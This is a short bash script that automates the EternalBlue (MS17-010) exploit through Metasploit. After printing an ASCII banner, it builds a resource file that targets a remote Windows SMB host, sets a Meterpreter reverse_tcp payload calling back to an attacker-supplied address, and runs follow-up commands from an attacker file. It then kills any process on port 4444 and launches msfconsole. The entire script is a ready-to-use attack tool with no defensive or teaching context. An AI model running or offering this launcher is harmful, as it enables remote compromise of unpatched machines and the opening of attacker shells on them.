cat << "EOF"
 _____ _                        _  ______ _            
|  ___| |                      | | | ___ \ |           
| |__ | |_ ___ _ __ _ __   __ _| | | |_/ / |_   _  ___ 
|  __|| __/ _ \ '__| '_ \ / _` | | | ___ \ | | | |/ _ \
| |___| ||  __/ |  | | | | (_| | | | |_/ / | |_| |  __/
\____/ \__\___|_|  |_| |_|\__,_|_| \____/|_|\__,_|\___|

EOF
echo Enternal Blue Metasploit Autolauncher
echo 
echo System start initiate.
echo Starting MS17-010 exploit...
touch config.rc
echo use windows/smb/ms17_010_eternalblue > config.rc
echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
echo set LHOST $1 >> config.rc
echo set RHOSTS $2 >> config.rc
echo set AutoRunScript multi_console_command -r /home/attacker/command.rc >> config.rc
echo exploit >> config.rc
netstat -anp|grep 4444|awk '{print $7}'|awk -F '/' '{print $1}'|xargs kill -s 9
msfconsole -r config.rc
rm config.rc
